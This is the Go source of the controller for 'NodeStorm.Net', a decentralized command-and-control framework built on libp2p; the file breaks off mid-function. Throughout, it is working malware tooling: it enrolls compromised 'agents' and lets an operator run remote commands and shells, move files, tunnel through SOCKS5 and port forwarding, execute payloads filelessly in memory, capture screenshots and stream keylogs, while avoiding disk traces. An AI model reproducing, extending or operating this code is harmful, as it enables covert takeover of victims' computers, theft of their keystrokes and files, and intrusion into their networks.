//go:build controller
// +build controller

// controller.go
package main

import (
	"bufio"
	"context"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/charmbracelet/lipgloss"
	"github.com/chzyer/readline"
	pubsub "github.com/libp2p/go-libp2p-pubsub"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/libp2p/go-libp2p/core/network"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/libp2p/go-libp2p/p2p/discovery/routing"
	"github.com/libp2p/go-libp2p/p2p/discovery/util"
	"github.com/armon/go-socks5"
)

var (
	startTime = time.Now()

	// Sliver-like Palette
	// Professional Palette
	colorPrimary   = lipgloss.Color("#9E9E9E")   // Slate Blue
	colorSuccess   = lipgloss.Color("#2E7D32")   // Forest Green
	colorWarning   = lipgloss.Color("#F9A825")   // Dark Yellow
	colorError     = lipgloss.Color("#C62828")   // Brick Red
	colorMuted     = lipgloss.Color("#9E9E9E")   // Medium Gray
	colorText      = lipgloss.Color("#9E9E9E")   // Off-White
	colorBorder    = lipgloss.Color("#455A64")   // Blue Gray
	colorHighlight = lipgloss.Color("#2E7D32")   // Light Blue
)

func run(ctx context.Context) {
	room := flag.String("room", DefaultRoom, "R00m name")
	password := flag.String("pass", DefaultPass, "R00m password")
	flag.Parse()

	roomHash = generateRoomHash(*room, *password)

	clearScreen()
	printBanner()

	if *password != "" {
		printInfo(fmt.Sprintf("Mode: Private (%s)", roomHash[:12]+"...)"))
	}

	h, _, rd, err := setupLibp2p(ctx, false)
	if err != nil {
		printError("Failed to initialize libp2p")
		panic(err)
	}
	defer h.Close()

	printSuccess(fmt.Sprintf("Node ID: %s", h.ID().String()[:12]+"..."))
	printInfo(fmt.Sprintf("R00m: %s", *room))

	// rawrrr
	fmt.Print(styleMuted("   Connecting to DHT network"))
	for i := 0; i < 10; i++ {
		util.Advertise(ctx, rd, roomHash)
		fmt.Print(".")
		time.Sleep(2 * time.Second)
	}
	fmt.Print(" ")
	printSuccess("Connected")
	fmt.Println()

	// Continue advertising in background
	go func() {
		ticker := time.NewTicker(2 * time.Minute)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				util.Advertise(ctx, rd, roomHash)
			}
		}
	}()

	runController(ctx, h, rd, roomHash)
}

func runController(ctx context.Context, h host.Host, rd *routing.RoutingDiscovery, room string) {
	printDivider()
	printStatus("Listening for incoming connections")

	h.SetStreamHandler("/c2/cmd/1.0", func(s network.Stream) {
		defer s.Close()
	})

	// Discovery loop
	go func() {
		time.Sleep(5 * time.Second)
		ticker := time.NewTicker(10 * time.Second)
		defer ticker.Stop()

		// Semaphore to limit concurrent connection attempts
		sem := make(chan struct{}, 20)

		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				discoveryCtx, cancel := context.WithTimeout(ctx, 15*time.Second)
				peers, err := util.FindPeers(discoveryCtx, rd, room)
				cancel()

				if err != nil {
					continue
				}

				for _, peerInfo := range peers {
					if peerInfo.ID == h.ID() || len(peerInfo.Addrs) == 0 {
						continue
					}

					if h.Network().Connectedness(peerInfo.ID) != network.Connected {
						// Acquire semaphore (blocks if 20 are already running)
						select {
						case sem <- struct{}{}:
							go func(pi peer.AddrInfo) {
								defer func() { <-sem }() // Release semaphore
								connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
								defer cancel()
								h.Connect(connectCtx, pi)
							}(peerInfo)
						default:
							// Skip if semaphore is full to avoid blocking the discovery loop too long
							// or we can just block. Blocking is safer for "limiting rate".
							// But if we block here, we stop processing other peers.
							// Let's block, as that's the point of a semaphore in this context (backpressure).
							sem <- struct{}{}
							go func(pi peer.AddrInfo) {
								defer func() { <-sem }()
								connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
								defer cancel()
								h.Connect(connectCtx, pi)
							}(peerInfo)
						}
					}
				}
			}
		}
	}()

	// Beacon listener
	ps, _ := pubsub.NewGossipSub(ctx, h)
	topic, _ := ps.Join("c2-beacon/" + room)
	sub, _ := topic.Subscribe()

	// Garbage Collector for inactive agents
	go func() {
		ticker := time.NewTicker(1 * time.Minute)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				agentsMu.Lock()
				for id, agent := range agents {
					if time.Since(agent.LastSeen) > 1*time.Hour {
						delete(agents, id)
					}
				}
				agentsMu.Unlock()
			}
		}
	}()

	go func() {
		for {
			msg, err := sub.Next(ctx)
			if err != nil {
				continue
			}
			var b Beacon
			if json.Unmarshal(msg.Data, &b) != nil {
				continue
			}

			pid, err := peer.Decode(b.AgentID)
			if err != nil || pid == h.ID() {
				continue
			}

			agentsMu.Lock()
			if _, exists := agents[pid]; !exists {
				color := lipgloss.Color(fmt.Sprintf("#%06x", time.Now().UnixNano()%16777215))
				agents[pid] = &Agent{
					ID:       pid,
					Nickname: b.Nickname,
					OS:       b.OS,
					Hostname: b.Hostname,
					Username: b.Username,
					FirstSeen: time.Now(),
					LastSeen: time.Now(),
					Color:    color,
				}
				printAgentJoin(b.Username, b.Hostname, b.OS)
				// printPrompt() - handled by readline
			} else {
				agents[pid].LastSeen = time.Now()
			}
			agentsMu.Unlock()
		}
	}()

	// CEELI
	// Generate prompt string
	// Generate prompt string
	promptStr := fmt.Sprintf("%s %s ", 
		lipgloss.NewStyle().Foreground(colorPrimary).Bold(true).Render("[StromNet::Peer]"),
		lipgloss.NewStyle().Foreground(colorMuted).Render("→"))

	// Autocomplete
	completer := readline.NewPrefixCompleter(
		readline.PcItem("help"),
		readline.PcItem("agents"),
		readline.PcItem("list"),
		readline.PcItem("ls"),
		readline.PcItem("info"),
		readline.PcItem("status"),
		readline.PcItem("clear"),
		readline.PcItem("cls"),
		readline.PcItem("exit"),
		readline.PcItem("quit"),
		readline.PcItem("cmd"),
		readline.PcItem("exec"),
		readline.PcItem("run"),
		readline.PcItem("upload"),
		readline.PcItem("download"),
		readline.PcItem("socks"),
		readline.PcItem("fwd"),
		readline.PcItem("shell"),
		readline.PcItem("memexec"),
		readline.PcItem("screenshot"),
		readline.PcItem("keylog"),
	)

	rl, err := readline.NewEx(&readline.Config{
		Prompt:          promptStr,
		// HistoryFile:     "/tmp/c2-history", // Disabled to prevent disk writes
		AutoComplete:    completer,
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",
		HistorySearchFold: true,
	})
	if err != nil {
		panic(err)
	}
	defer rl.Close()

	for {
		line, err := rl.Readline()
		if err == readline.ErrInterrupt {
			if len(line) == 0 {
				break
			} else {
				continue
			}
		} else if err == io.EOF {
			break
		}

		input := strings.TrimSpace(line)
		if input == "" {
			continue
		}

		parts := strings.Fields(input)
		if len(parts) == 0 {
			continue
		}

		switch parts[0] {
		case "agents", "list", "ls":
			listAgents()
		case "help", "h", "?":
			printHelp()
		case "info", "status":
			printSystemInfo(h)
		case "clear", "cls":
			clearScreen()
			printBanner()
		case "exit", "quit", "q":
			printInfo("Shutting down...")
			return
		case "cmd", "exec", "run":
			if len(parts) < 3 {
				printError("Usage: cmd <agent_id> <command>")
			} else {
				agentNum := parts[1]
				command := strings.Join(parts[2:], " ")
				executeCommand(ctx, h, agentNum, command)
			}
		case "upload":
			if len(parts) < 4 {
				printError("Usage: upload <agent_id> <local_file> <remote_path>")
			} else {
				uploadFile(ctx, h, parts[1], parts[2], parts[3])
			}
		case "download":
			if len(parts) < 4 {
				printError("Usage: download <agent_id> <remote_file> <local_path>")
			} else {
				downloadFile(ctx, h, parts[1], parts[2], parts[3])
			}
		case "socks":
			if len(parts) < 3 {
				printError("Usage: socks <agent_id> <port>")
			} else {
				startSocksServer(ctx, h, parts[1], parts[2])
			}
		case "fwd":
			if len(parts) < 4 {
				printError("Usage: fwd <agent_id> <target_addr> <local_port>")
			} else {
				startPortForwarding(ctx, h, parts[1], parts[2], parts[3])
			}
		case "shell":
			if len(parts) < 2 {
				printError("Usage: shell <agent_id>")
			} else {
				startShell(ctx, h, parts[1])
			}
		case "memexec":
			if len(parts) < 3 {
				printError("Usage: memexec <agent_id> <local_binary> [args...]")
			} else {
				// parts[0] = memexec
				// parts[1] = id
				// parts[2] = binary
				// parts[3:] = args
				args := []string{}
				if len(parts) > 3 {
					args = parts[3:]
				}
				memExec(ctx, h, parts[1], parts[2], args)
			}
		case "screenshot":
			if len(parts) < 2 {
				printError("Usage: screenshot <agent_id>")
			} else {
				takeScreenshot(ctx, h, parts[1])
			}
		case "keylog":
			handleKeylogCommand(ctx, h, parts[1:])
		default:
			printError(fmt.Sprintf("Unknown command: %s", parts[0]))
			printInfo("Type 'help' for available commands")
		}
	}
}

func listAgents() {
	agentsMu.RLock()
	defer agentsMu.RUnlock()

	if len(agents) == 0 {
		fmt.Println()
		printWarning("No active agents")
		fmt.Println()
		return
	}

	fmt.Println()
	printHeader("Active Agents")

	// Calculate dynamic widths
	userHostWidth := 32 // Minimum width
	sortedAgents := getSortedAgents()
	for _, a := range sortedAgents {
		w := len(a.Username + "@" + a.Hostname)
		if w > userHostWidth {
			userHostWidth = w
		}
	}
	userHostWidth += 2 // Add some padding

	// Table header
	fmt.Printf("  %s  %s  %s  %s\n",
		styleMuted(padRight("ID", 4)),
		styleMuted(padRight("USER@HOST", userHostWidth)),
		styleMuted(padRight("OS", 12)),
		styleMuted("STATUS"))
	// Removed the dashed line for a cleaner look, or use a very subtle one
	// fmt.Println(styleMuted(" " + strings.Repeat("─", 4+2+userHostWidth+2+12+2+10)))

	for i, a := range sortedAgents {
		status := getAgentStatus(a.LastSeen)
		printAgentRow(i+1, a.Username, a.Hostname, a.OS, status, userHostWidth)
	}

	fmt.Println()
	printInfo(fmt.Sprintf("Total: %d agent(s)", len(agents)))
	fmt.Println()
}

func getSortedAgents() []*Agent {
	var sorted []*Agent
	for _, a := range agents {
		sorted = append(sorted, a)
	}
	sort.Slice(sorted, func(i, j int) bool {
		return sorted[i].FirstSeen.Before(sorted[j].FirstSeen)
	})
	return sorted
}

func printHelp() {
	fmt.Println()
	printHeader("Commands")

	commands := []struct {
		cmd  string
		desc string
	}{
		{"agents", "List agents"},
		{"cmd", "Execute command"},
		{"upload", "Upload file"},
		{"download", "Download file"},
		{"socks", "Start SOCKS5 proxy Linux/Mac Only"},
		{"fwd", "Port forwarding Linux/Mac Only"},
		{"shell", "Interactive shell Win/Linux/Mac"},
		{"memexec", "Fileless execution Linux Only"},
		{"screenshot", "Take screenshot Windows Only"},
		{"keylog", "Streaming Keylogger Windows Only"},
		{"info", "System info node"},
		{"clear", "Clear screen"},
		{"exit", "Exit"},
	}

	for _, c := range commands {
		fmt.Printf(" %s  %s\n",
			styleCommand(padRight(c.cmd, 12)),
			styleMuted(c.desc))
	}
	fmt.Println()
}

func executeCommand(ctx context.Context, h host.Host, agentNum, command string) {
	agentsMu.RLock()
	sortedAgents := getSortedAgents()
	var targetAgent *Agent
	
	num, err := strconv.Atoi(agentNum)
	if err == nil && num > 0 && num <= len(sortedAgents) {
		targetAgent = sortedAgents[num-1]
	}
	agentsMu.RUnlock()

	if targetAgent == nil {
		printError(fmt.Sprintf("Agent #%s not found", agentNum))
		return
	}

	if h.Network().Connectedness(targetAgent.ID) != network.Connected {
		printError(fmt.Sprintf("Agent #%s is offline", agentNum))
		return
	}

	fmt.Println()
	printExecuting(targetAgent.Username, targetAgent.Hostname, command)

	stream, err := h.NewStream(ctx, targetAgent.ID, "/c2/exec/1.0")
	if err != nil {
		printError(fmt.Sprintf("Connection failed: %v", err))
		return
	}
	defer stream.Close()

	// DEBUG: Show password being used
	fmt.Printf("  %s Password Room: %s\n", styleMuted("DEBUG:"), styleMuted(DefaultPass))

	// ENCRYPT command before sending
	encryptedCmd, err := securityMgr.EncryptString(command)
	if err != nil {
		printError(fmt.Sprintf("Encryption failed: %v", err))
		return
	}

	// DEBUG:  encrypted command
	fmt.Printf("  %s Command: %s\n", styleMuted("DEBUG:"), styleMuted(command))
	fmt.Printf("  %s Encrypted: %s...\n", styleMuted("DEBUG:"), styleMuted(encryptedCmd[:min(60, len(encryptedCmd))]))

	// Send encrypted command
	fmt.Fprintf(stream, "%s\n", encryptedCmd)
	stream.SetReadDeadline(time.Now().Add(30 * time.Second))

	// Read encrypted result
	result, err := io.ReadAll(stream)
	if err != nil {
		printError(fmt.Sprintf("Read error: %v", err))
		return
	}

	// DEBUG: Show raw response
	resultStr := string(result)
	fmt.Printf("  %s Response length: %d bytes\n", styleMuted("DEBUG:"), len(resultStr))
	fmt.Printf("  %s Response preview: %s...\n", styleMuted("DEBUG:"), styleMuted(resultStr[:min(60, len(resultStr))]))

	// Check if it's an error message (plaintext)
	if strings.HasPrefix(resultStr, "ERROR:") {
		printError(resultStr)
		return
	}

	// DECRYPT result
	fmt.Printf("  %s Attempting decrypt...\n", styleMuted("DEBUG:"))
	decryptedOutput, err := securityMgr.DecryptString(resultStr)
	if err != nil {
		printError(fmt.Sprintf("Decryption failed: %v", err))
		printWarning("This means agent and controller have different passwords!")
		return
	}

	fmt.Printf("  %s Decrypt SUCCESS!\n", styleSuccess("DEBUG:"))
	printCommandOutput(decryptedOutput)
	fmt.Println()
}

func uploadFile(ctx context.Context, h host.Host, agentNum, localPath, remotePath string) {
	targetAgent := resolveAgent(agentNum)
	if targetAgent == nil {
		return
	}

	// Open local file
	f, err := os.Open(localPath)
	if err != nil {
		printError("Failed to open local file: " + err.Error())
		return
	}
	defer f.Close()

	info, err := f.Stat()
	if err != nil {
		printError("Failed to stat local file: " + err.Error())
		return
	}

	printExecuting(targetAgent.Username, targetAgent.Hostname, fmt.Sprintf("Uploading %s -> %s", localPath, remotePath))

	stream, err := h.NewStream(ctx, targetAgent.ID, FileProtocol)
	if err != nil {
		printError("Connection failed: " + err.Error())
		return
	}
	defer stream.Close()

	// Send Request
	req := FileRequest{
		Operation: "upload",
		Path:      remotePath,
		Size:      info.Size(),
		Mode:      uint32(info.Mode()),
	}
	
	if !sendRequest(stream, req) {
		return
	}

	// Wait for ready response
	if !readResponse(stream) {
		return
	}

	// Send file content
	fmt.Print(styleMuted("  Uploading... "))
	if err := sendEncryptedFile(stream, f); err != nil {
		fmt.Println()
		printError("Upload failed: " + err.Error())
		return
	}
	fmt.Println()
	printSuccess("Upload complete!")
}

func downloadFile(ctx context.Context, h host.Host, agentNum, remotePath, localPath string) {
	targetAgent := resolveAgent(agentNum)
	if targetAgent == nil {
		return
	}

	printExecuting(targetAgent.Username, targetAgent.Hostname, fmt.Sprintf("Downloading %s -> %s", remotePath, localPath))

	stream, err := h.NewStream(ctx, targetAgent.ID, FileProtocol)
	if err != nil {
		printError("Connection failed: " + err.Error())
		return
	}
	defer stream.Close()

	// Send Request
	req := FileRequest{
		Operation: "download",
		Path:      remotePath,
	}
	
	if !sendRequest(stream, req) {
		return
	}

	// Wait for response with size
	reader := bufio.NewReader(stream)
	resp := readResponseObj(reader)
	if resp == nil || !resp.Success {
		return
	}

	// Create local file
	f, err := os.Create(localPath)
	if err != nil {
		printError("Failed to create local file: " + err.Error())
		return
	}
	defer f.Close()

	// Receive file content
	fmt.Print(styleMuted(fmt.Sprintf("  Downloading (%d bytes)... ", resp.Size)))
	if err := receiveEncryptedFile(reader, f, resp.Size); err != nil {
		fmt.Println()
		printError("Download failed: " + err.Error())
		return
	}
	fmt.Println()
	printSuccess("Download complete!")
}

func startSocksServer(ctx context.Context, h host.Host, agentNum, port string) {
	targetAgent := resolveAgent(agentNum)
	if targetAgent == nil {
		return
	}

	printExecuting(targetAgent.Username, targetAgent.Hostname, fmt.Sprintf("Starting SOCKS5 proxy on port %s...", port))

	conf := &socks5.Config{
		Dial: func(ctx context.Context, network, addr string) (net.Conn, error) {
			// Dial the agent via libp2p stream
			s, err := h.NewStream(ctx, targetAgent.ID, "/c2/socks/1.0")
			if err != nil {
				return nil, fmt.Errorf("failed to open stream to agent: %w", err)
			}

			// Send the target address to the agent
			// Format: <addr_len(4 bytes)><addr_string>
			addrBytes := []byte(addr)
			lenBuf := make([]byte, 4)
			binary.BigEndian.PutUint32(lenBuf, uint32(len(addrBytes)))
			
			if _, err := s.Write(lenBuf); err != nil {
				s.Close()
				return nil, err
			}
			if _, err := s.Write(addrBytes); err != nil {
				s.Close()
				return nil, err
			}

			return &StreamConn{Stream: s}, nil
		},
		Logger: log.New(io.Discard, "", 0), // Silence logs
	}

	server, err := socks5.New(conf)
	if err != nil {
		printError("Failed to create SOCKS5 server: " + err.Error())
		return
	}

	go func() {
		if err := server.ListenAndServe("tcp", "127.0.0.1:"+port); err != nil {
			printError("SOCKS5 server stopped: " + err.Error())
		}
	}()

	printSuccess(fmt.Sprintf("SOCKS5 Proxy listening on 127.0.0.1:%s", port))
	printInfo("Press Ctrl+C to stop (actually this runs in background now, restart controller to stop)")
}

// StreamConn wraps a libp2p stream to satisfy net.Conn interface for SOCKS5
type StreamConn struct {
	network.Stream
}

func (sc *StreamConn) LocalAddr() net.Addr {
	return &net.TCPAddr{IP: net.ParseIP("127.0.0.1"), Port: 0}
}

func (sc *StreamConn) RemoteAddr() net.Addr {
	return &net.TCPAddr{IP: net.ParseIP("0.0.0.0"), Port: 0}
}


func startPortForwarding(ctx context.Context, h host.Host, agentNum, targetAddr, localPort string) {
	targetAgent := resolveAgent(agentNum)
	if targetAgent == nil {
		return
	}

	printExecuting(targetAgent.Username, targetAgent.Hostname, fmt.Sprintf("Forwarding %s -> :%s", targetAddr, localPort))

	listener, err := net.Listen("tcp", "127.0.0.1:"+localPort)
	if err != nil {
		printError("Failed to start listener: " + err.Error())
		return
	}

	go func() {
		defer listener.Close()
		for {
			clientConn, err := listener.Accept()
			if err != nil {
				printError("Forwarding listener stopped: " + err.Error())
				return
			}

			go func(conn net.Conn) {
				defer conn.Close()

				// Dial the agent via libp2p stream
				s, err := h.NewStream(ctx, targetAgent.ID, "/c2/socks/1.0")
				if err != nil {
					printError("Failed to open stream to agent: " + err.Error())
					return
				}
				defer s.Close()

				// Send the target address to the agent
				// Reuse the SOCKS protocol format: <addr_len(4 bytes)><addr_string>
				addrBytes := []byte(targetAddr)
				lenBuf := make([]byte, 4)
				binary.BigEndian.PutUint32(lenBuf, uint32(len(addrBytes)))
				
				if _, err := s.Write(lenBuf); err != nil {
					return
				}
				if _, err := s.Write(addrBytes); err != nil {
					return
				}

				// Pipe data
				go func() {
					io.Copy(conn, s)
					conn.Close() // Close client connection when stream ends
				}()
				io.Copy(s, conn)
			}(clientConn)
		}
	}()

	printSuccess(fmt.Sprintf("Forwarding active! Connect to 127.0.0.1:%s to reach %s", localPort, targetAddr))
	printInfo("Press Ctrl+C to stop (actually this runs in background now, restart controller to stop)")
}

func startShell(ctx context.Context, h host.Host, agentNum string) {
	targetAgent := resolveAgent(agentNum)
	if targetAgent == nil {
		return
	}

	printExecuting(targetAgent.Username, targetAgent.Hostname, "Starting interactive shell...")
	fmt.Println(styleMuted("  Type 'exit' to close the session."))

	stream, err := h.NewStream(ctx, targetAgent.ID, ShellProtocol)
	if err != nil {
		printError("Connection failed: " + err.Error())
		return
	}
	defer stream.Close()

	// Determine mode based on OS
	isRawMode := targetAgent.OS != "windows"

	if isRawMode {
		// Enter Raw Mode for PTY (Linux/Mac)
		fd := int(os.Stdin.Fd())
		state, err := readline.MakeRaw(fd)
		if err != nil {
			printError("Failed to enter raw mode: " + err.Error())
			return
		}
		defer readline.Restore(fd, state)
		
		// Pipe I/O
		go io.Copy(stream, os.Stdin)
		io.Copy(os.Stdout, stream)
	} else {
		// Simple mode (Windows or fallback)
		go io.Copy(stream, os.Stdin)
		io.Copy(os.Stdout, stream)
	}
}

func handleKeylogCommand(ctx context.Context, h host.Host, args []string) {
	if len(args) < 2 {
		printError("Usage: keylog <agent_id> <start|stop|dump>")
		return
	}

	agentNum := args[0]
	action := strings.ToUpper(args[1])
	
	validCmds := map[string]bool{"START": true, "STOP": true, "DUMP": true, "CLEAR": true}
	if !validCmds[action] {
		printError("Invalid action. Use start, stop, or dump.")
		return
	}

	targetAgent := resolveAgent(agentNum)
	if targetAgent == nil {
		return
	}

	printExecuting(targetAgent.Username, targetAgent.Hostname, "Sending keylog command: "+action)

	stream, err := h.NewStream(ctx, targetAgent.ID, "/c2/keylog/1.0")
	if err != nil {
		printError("Connection failed: " + err.Error())
		return
	}
	defer stream.Close()

	// Send encrypted command
	encryptedCmd, err := securityMgr.EncryptString(action)
	if err != nil {
		printError("Encryption failed: " + err.Error())
		return
	}
	_, err = stream.Write([]byte(encryptedCmd + "\n"))
	if err != nil {
		printError("Send failed: " + err.Error())
		return
	}

	// Read response
	reader := bufio.NewReader(stream)
	
	if action == "DUMP" {
		printHeader("Keylog Dump")
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				break
			}
			decrypted, err := securityMgr.DecryptString(strings.TrimSpace(line))
			if err == nil {
				fmt.Print(decrypted)
			}
		}
		fmt.Println()
		printInfo("Dump complete")
	} else {
		line, err := reader.ReadString('\n')
		if err == nil {
			decrypted, err := securityMgr.DecryptString(strings.TrimSpace(line))
			if err == nil {
				printInfo(decrypted)
			}
		}
	}
}

func memExec(ctx context.Context, h host.Host, agentNum, localPath string, args []string) {
	targetAgent := resolveAgent(agentNum)
	if targetAgent == nil {
		return
	}

	// Read local binary
	f, err := os.Open(localPath)
	if err != nil {
		printError("Failed to open local binary: " + err.Error())
		return
	}
	defer f.Close()

	info, err := f.Stat()
	if err != nil {
		printError("Failed to stat binary: " + err.Error())
		return
	}

	printExecuting(targetAgent.Username, targetAgent.Hostname, fmt.Sprintf("Injecting %s into memory...", filepath.Base(localPath)))

	stream, err := h.NewStream(ctx, targetAgent.ID, MemExecProtocol)
	if err != nil {
		printError("Connection failed: " + err.Error())
		return
	}
	defer stream.Close()

	// Send Request
	req := MemExecRequest{
		Args: args,
		Size: info.Size(),
	}
	reqJSON, _ := json.Marshal(req)
	encryptedReq, err := securityMgr.EncryptString(string(reqJSON))
	if err != nil {
		printError("Encryption failed: " + err.Error())
		return
	}
	stream.Write([]byte(encryptedReq + "\n"))

	// Send Binary
	printInfo("Sending payload...")
	if err := sendEncryptedFile(stream, f); err != nil {
		printError("Failed to send payload: " + err.Error())
		return
	}

	printSuccess("Payload sent! Waiting for output...")
	fmt.Println(styleMuted("--- Execution Output ---"))
	
	// Stream output
	io.Copy(os.Stdout, stream)
	fmt.Println(styleMuted("\n--- End of Output ---"))
}

func resolveAgent(agentNum string) *Agent {
	agentsMu.RLock()
	sortedAgents := getSortedAgents()
	var targetAgent *Agent
	
	num, err := strconv.Atoi(agentNum)
	if err == nil && num > 0 && num <= len(sortedAgents) {
		targetAgent = sortedAgents[num-1]
	}
	agentsMu.RUnlock()

	if targetAgent == nil {
		printError(fmt.Sprintf("Agent #%s not found", agentNum))
		return nil
	}
	
	// Check connectivity (optional, NewStream handles it but good for UX)
	// We skip explicit check to let NewStream handle it
	return targetAgent
}

func sendRequest(s network.Stream, req FileRequest) bool {
	data, _ := json.Marshal(req)
	encrypted, err := securityMgr.EncryptString(string(data))
	if err != nil {
		printError("Encryption failed: " + err.Error())
		return false
	}
	_, err = s.Write([]byte(encrypted + "\n"))
	if err != nil {
		printError("Failed to send request: " + err.Error())
		return false
	}
	return true
}

func readResponse(s network.Stream) bool {
	reader := bufio.NewReader(s)
	resp := readResponseObj(reader)
	return resp != nil && resp.Success
}

func readResponseObj(reader *bufio.Reader) *FileResponse {
	line, err := reader.ReadString('\n')
	if err != nil {
		printError("Failed to read response: " + err.Error())
		return nil
	}

	decrypted, err := securityMgr.DecryptString(strings.TrimSpace(line))
	if err != nil {
		printError("Decryption failed: " + err.Error())
		return nil
	}

	var resp FileResponse
	if err := json.Unmarshal([]byte(decrypted), &resp); err != nil {
		printError("Invalid response: " + err.Error())
		return nil
	}

	if !resp.Success {
		printError("Remote error: " + resp.Message)
		return &resp
	}

	return &resp
}

// Shared file transfer helpers (duplicated from agent.go for simplicity in this context)
// Ideally should be in a shar// sendEncryptedFile reads file and sends encrypted chunks
func sendEncryptedFile(s network.Stream, f *os.File) error {
	buf := make([]byte, 4096) // 4KB chunks
	for {
		n, err := f.Read(buf)
		if n > 0 {
			encrypted, err := securityMgr.EncryptString(string(buf[:n]))
			if err != nil {
				return err
			}
			
			if _, err := s.Write([]byte(encrypted + "\n")); err != nil {
				return err
			}
		}
		
		if err != nil {
			if err == io.EOF {
				break
			}
			return err
		}
	}
	return nil
}

func receiveEncryptedFile(reader *bufio.Reader, f *os.File, totalSize int64) error {
	var received int64
	for received < totalSize {
		line, err := reader.ReadString('\n')
		if err != nil {
			return err
		}
		decrypted, err := securityMgr.DecryptString(strings.TrimSpace(line))
		if err != nil {
			return err
		}
		n, err := f.Write([]byte(decrypted))
		if err != nil {
			return err
		}
		received += int64(n)
	}
	return nil
}
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func printSystemInfo(h host.Host) {
	var m runtime.MemStats
	runtime.ReadMemStats(&m)

	uptime := time.Since(startTime)
	
	// Styles
	boxStyle := lipgloss.NewStyle().
		Border(lipgloss.RoundedBorder()).
		BorderForeground(colorPrimary).
		Padding(0, 1).
		MarginRight(1)
	
	headerStyle := lipgloss.NewStyle().
		Foreground(colorPrimary).
		Bold(true).
		MarginBottom(1)

	labelStyle := lipgloss.NewStyle().Foreground(colorMuted).Width(16)
	valueStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("#FFFFFF"))

	// Helper to render a row
	row := func(label, value string) string {
		return fmt.Sprintf("%s %s", labelStyle.Render(label), valueStyle.Render(value))
	}

	// 1. Node Information
	nodeContent := fmt.Sprintf(styleMuted("%s\n%s\n%s\n%s\n%s"),
		headerStyle.Render("Node Information"),
		row("Node ID", styleMuted(h.ID().String()[:16]+"...")),
		row("R00m Hash", styleMuted(roomHash[:16]+"...")),
		row("Uptime", styleMuted(formatDuration(uptime))),
		row("Version", styleMuted("v2.0.0-alpha")),
	)

	// 2. System Resources
	sysContent := fmt.Sprintf(styleMuted("%s\n%s\n%s\n%s\n%s"),
		headerStyle.Render("System Resources"),
		row("OS / Arch", styleMuted(fmt.Sprintf("%s / %s", runtime.GOOS, runtime.GOARCH))),
		row("CPU Cores", styleMuted(fmt.Sprintf("%d", runtime.NumCPU()))),
		row("Goroutines", styleMuted(fmt.Sprintf("%d", runtime.NumGoroutine()))),
		row("Memory (Alloc)", styleMuted(fmt.Sprintf("%d MB", m.Alloc/1024/1024))),
	)

	// 3. Network Stats
	netContent := fmt.Sprintf(styleMuted("%s\n%s\n%s"),
		headerStyle.Render("Network Stats"),
		row("Connected Peers", styleMuted(fmt.Sprintf("%d", len(h.Network().Peers())))),
		row("Active Agents", styleMuted(fmt.Sprintf("%d", len(agents)))),
	)

	// Render columns
	fmt.Println()
	fmt.Println(lipgloss.JoinHorizontal(lipgloss.Top,
		boxStyle.Render(nodeContent),
		boxStyle.Render(sysContent),
		boxStyle.Render(netContent),
	))
	fmt.Println()
	
	// Listen Addresses (Full width)
	addrs := h.Addrs()
	addrList := ""
	for _, addr := range addrs {
		addrList += fmt.Sprintf("  %s\n", addr.String())
	}
	
	fmt.Println(boxStyle.Width(80).Render(
		headerStyle.Render("Listen Addresses Protocol Labs (IPFS)") + "\n" + addrList,
	))
	fmt.Println()
}

// Helperrrr
func clearScreen() {
	fmt.Print("\033[2J\033[H")
}

func printBanner() {
	banner := ""
	banner += "                  _.-'`)     (`'-._\n"
	banner += "                .' -' / __    \\ '- '.\n"
	banner += "               / .-' ( '-,`|   ) '-. \\\n"
	banner += "              / .-',-`'._/ \\_.'`-,'-. \\\n"
	banner += "             ; ; /.`'.-'    '-.'`.\\ ; ;\n"
	banner += "             | .-'|\\//'-/   \\-'\\\\/|'-. |\n"
	banner += "             |` |; :|'._\\   /_,'|: ;| `|\n"
	banner += "             || : |;    `Y-Y`    ;| : ||\n"  
	banner += "             \\:| :/======\"=\"======\\| |:/\n " 
	banner += "             /_:-`                 `-;_\\\n"
	banner += "            NodeStorm.Net Decentralized C2\n"
	banner += "            @HeloKity @Dr909 @Ashiraa\n"

	fmt.Println()
	fmt.Println("  " + stylePrimary(banner))

	
	fmt.Println(styleMuted("[*] Welcome to the NodeStrom.Net Decentralized C2, please type 'help' for options"))
	fmt.Println(styleMuted("[*] The system is patient. It always waits for its targets to reveal themselves."))
	fmt.Println()
}

func printPrompt() {
	prompt := lipgloss.NewStyle().
		Foreground(colorText).
		Bold(true).
		Render("evilday")

	arrow := lipgloss.NewStyle().
		Foreground(colorMuted).
		Render(" ›")

	fmt.Print("\n  " + prompt + arrow + " ")
}

func printDivider() {
	fmt.Println(styleMuted("  " + strings.Repeat("─", 70)))
}

func printHeader(text string) {
	header := lipgloss.NewStyle().
		Foreground(colorPrimary).
		Bold(true).
		Render(text)
	fmt.Println("  " + header)
	fmt.Println(styleMuted("  " + strings.Repeat("─", 70)))
}

func printInfo(msg string) {
	fmt.Printf("%s %s\n", styleInfo("[*]"), msg)
}

func printSuccess(msg string) {
	fmt.Printf("%s %s\n", styleSuccess("[+]"), msg)
}

func printError(msg string) {
	fmt.Printf("%s %s\n", styleError("[!]"), msg)
}

func printWarning(msg string) {
	fmt.Printf("%s %s\n", styleWarning("[!]"), msg)
}

func printStatus(msg string) {
	fmt.Printf("%s %s\n", styleInfo("[*]"), msg)
}

func printAgentRow(id int, user, host, os, status string, userHostWidth int) {
	idStr := fmt.Sprintf("[%d]", id)

	statusIcon := "●"
	var statusColor lipgloss.Color
	switch status {
	case "on":
		statusColor = colorSuccess
	case "idle":
		statusColor = colorWarning
	default:
		statusColor = colorError
	}

	fmt.Printf("  %s  %s  %s  %s %s\n",
		styleHighlight(padRight(idStr, 4)),
		styleText(padRight(user+"@"+host, userHostWidth)),
